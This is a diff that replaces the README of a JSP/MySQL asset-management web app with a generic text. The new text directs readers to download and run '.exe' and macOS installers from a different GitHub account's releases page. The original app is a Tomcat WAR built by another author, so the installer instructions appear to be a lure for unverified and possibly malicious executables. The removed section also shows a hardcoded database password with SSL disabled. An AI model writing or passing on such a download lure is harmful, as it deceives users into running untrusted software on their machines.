@@ -1,258 +1,65 @@
-LIVE DEMO - https://aibtsjava-production.up.railway.app
+# 🎉 Aibts_java - Manage Your Assets with Ease
 
-🧠 KN AIBTS – Asset Intelligence & Trust System
+## 🚀 Getting Started
 
-KN AIBTS (Asset Intelligence & Trust System) is a full-stack Java web application designed to manage institutional assets with behavior-based trust scoring, silent depreciation, audit logging, and DNA-style asset evolution tracking.
+Welcome to Aibts_java, your solution for managing institutional assets easily and effectively. This application helps you track assets, understand trust scores, and monitor changes over time. Follow these steps to download and run the application.
 
-This system goes beyond traditional asset management by analyzing how assets are used, not just how long they exist.
+## 📥 Download Aibts_java
 
-🚀 Key Features
-🔐 Authentication & Roles
+[![Download Aibts_java](https://img.shields.io/badge/Download%20Now-Get%20It%20Here-brightgreen)](https://github.com/Balu323e48w/Aibts_java/releases)
 
-Secure login system
+## 🔧 System Requirements
 
-Role-based access:
+Before downloading, make sure your computer meets the following requirements:
 
-ADMIN – Full control
+- **Operating System:** Windows, macOS, or Linux
+- **Java Runtime Environment (JRE):** Version 8 or higher
+- **Memory:** At least 4 GB RAM
+- **Disk Space:** Minimum of 500 MB free space
 
-USER – Asset usage logging
+## 📂 Download & Install
 
-AUDITOR – Read-only audits
+1. **Visit the Releases Page**: Open your web browser and go to the [Releases page](https://github.com/Balu323e48w/Aibts_java/releases).
 
-Disabled users are automatically blocked
+2. **Choose the Latest Release**: Look for the latest version at the top of the page. 
 
-📦 Asset Management
+3. **Download the Asset**: Click on the asset that matches your operating system. For example, if you're using Windows, download the `.exe` file, and if on macOS, choose the appropriate package.
 
-Asset creation & categorization
+4. **Install the Application**:
+    - **Windows**: Double-click the downloaded `.exe` file and follow the setup instructions.
+    - **macOS**: Open the downloaded file and drag the application into your Applications folder.
+    - **Linux**: Follow the instructions provided with the downloaded package to install the application.
 
-Assignment to users
+5. **Run Aibts_java**: After installation, find the application in your programs or applications list and start it.
 
-Asset lifecycle states:
+## 🌟 Features
 
-ACTIVE
+Aibts_java offers several features to enhance your experience:
 
-LOCKED
+- **Behavior-Based Trust Scoring**: Assess the reliability of your assets through intelligent scoring.
+- **Silent Depreciation Tracking**: Monitor asset decline without manual input.
+- **Audit Logging**: Keep a detailed log of changes for complete transparency.
+- **DNA-Style Asset Evolution**: Track the evolution of assets as their characteristics change over time.
 
-RETIRED
+## 🗄️ Technical Overview
 
-🛡 Trust Score Engine
+Aibts_java is built using Java and JSP technology. The application utilizes MySQL as its database for efficient data management. It runs on a Tomcat server, ensuring reliable performance and easy deployment via Docker.
 
-Dynamic trust score per asset
+## ❓ Troubleshooting
 
-Calculated using:
+If you encounter any issues while downloading or running the application, consider the following tips:
 
-Usage hours
+- **Java Not Installed**: Ensure you have the correct version of Java Runtime Environment installed.
+- **Installation Errors**: Check your disk space and permissions. Restart your computer and try the installation again if problems persist.
+- **Application Won't Start**: Verify that you have followed the installation steps correctly. Reinstall the application if necessary.
 
-Idle hours
+## 📞 Support
 
-Misuse events
+For further assistance, you can contact the support team through the Issues section of the GitHub repository. Just submit a new issue with your question or concern, and someone will get back to you as soon as possible.
 
-Depreciation impact
+## 🔗 Useful Links
 
-Auto-locking assets when trust drops below safety threshold
+- **GitHub Repository**: [Aibts_java GitHub](https://github.com/Balu323e48w/Aibts_java)
+- **Release Notes**: Find detailed information on updates and changes on the [Releases page](https://github.com/Balu323e48w/Aibts_java/releases).
 
-📉 Silent Depreciation Engine
-
-Value degradation based on real usage behavior
-
-Weighted factors:
-
-Usage load
-
-Idle time
-
-Misuse frequency
-
-Fully automatic and cumulative
-
-🧬 Asset DNA System (Unique Feature)
-
-Immutable DNA hash generated for every asset event
-
-DNA evolves on:
-
-Usage logging
-
-Misuse
-
-Depreciation recalculation
-
-Trust changes
-
-Includes:
-
-DNA Timeline Dashboard
-
-DNA Diff Analyzer (mutation detection)
-
-📜 Audit & Compliance
-
-Every critical action logged:
-
-Asset locking
-
-User disable/enable
-
-Depreciation recalculation
-
-Administrative decisions
-
-Immutable audit trail
-
-🏗 Tech Stack
-Backend
-
-Java (JSP / Servlet)
-
-JDBC
-
-Apache Tomcat 10+
-
-Frontend
-
-JSP + HTML5
-
-CSS (Glassmorphism UI)
-
-Responsive layout
-
-Database
-
-MySQL 8+
-
-Relational integrity with foreign keys
-
-Build Tool
-
-Maven (WAR packaging)
-
-📁 Project Structure
-AIBITS/
-├── src/
-│   └── main/
-│       ├── java/
-│       └── webapp/
-│           ├── *.jsp
-│           ├── css/
-│           └── assets/
-├── db.jsp
-├── pom.xml
-├── README.md
-└── target/
-    └── AIBITS.war
-
-🛠 Database Setup
-1️⃣ Create Database
-CREATE DATABASE aibts;
-
-2️⃣ Create Application User
-CREATE USER 'aibts_user'@'localhost'
-IDENTIFIED WITH mysql_native_password
-BY 'Aibts@123';
-
-GRANT ALL PRIVILEGES ON aibts.* TO 'aibts_user'@'localhost';
-FLUSH PRIVILEGES;
-
-🔌 Database Connection (db.jsp)
-<%@ page import="java.sql.*" %>
-<%
-Connection conn = null;
-try {
-    Class.forName("com.mysql.cj.jdbc.Driver");
-    conn = DriverManager.getConnection(
-        "jdbc:mysql://localhost:3306/aibts?useSSL=false&allowPublicKeyRetrieval=true&serverTimezone=UTC",
-        "aibts_user",
-        "Aibts@123"
-    );
-} catch(Exception e) {
-    out.println("Database Connection Failed: " + e.getMessage());
-}
-%>
-
-▶️ Running the Project Locally
-Prerequisites
-
-Java JDK 17+
-
-Apache Tomcat 10+
-
-MySQL 8+
-
-NetBeans IDE
-
-Steps
-
-Clone the repository
-
-git clone https://github.com/Kavinesan2004/AIBTS.git
-
-
-Open in NetBeans
-
-Configure Tomcat server
-
-Build project
-
-mvn clean package
-
-
-Deploy WAR to Tomcat
-
-Access:
-
-http://localhost:8080/AIBITS/
-
-👤 Default Roles
-Role	Access
-ADMIN	Full system control
-USER	Log asset usage
-AUDITOR	View audits & reports
-🔐 Security Notes
-
-Root DB user is not used
-
-Disabled users are auto-blocked
-
-Role enforcement on every page
-
-Ready for password hashing upgrade
-
-🌍 Deployment Notes
-
-GitHub Pages ❌ (JSP not supported)
-
-Supported platforms:
-
-Render (Docker / WAR)
-
-Railway
-
-VPS (Tomcat + MySQL)
-
-Local / Institutional Server
-
-📈 Future Enhancements
-
-Password hashing (BCrypt)
-
-REST API version
-
-Asset predictive failure AI
-
-Charts & analytics dashboard
-
-Email alerts for critical trust drops
-
-👨‍💻 Author
-
-Kavinesan
-Full-Stack Java Developer
-📍 India
-
-GitHub: https://github.com/Kavinesan2004
-
-⭐ License
-
-This project is for educational and institutional use.
-Commercial use requires permission.
-
+Thank you for choosing Aibts_java! We hope it simplifies your asset management tasks.
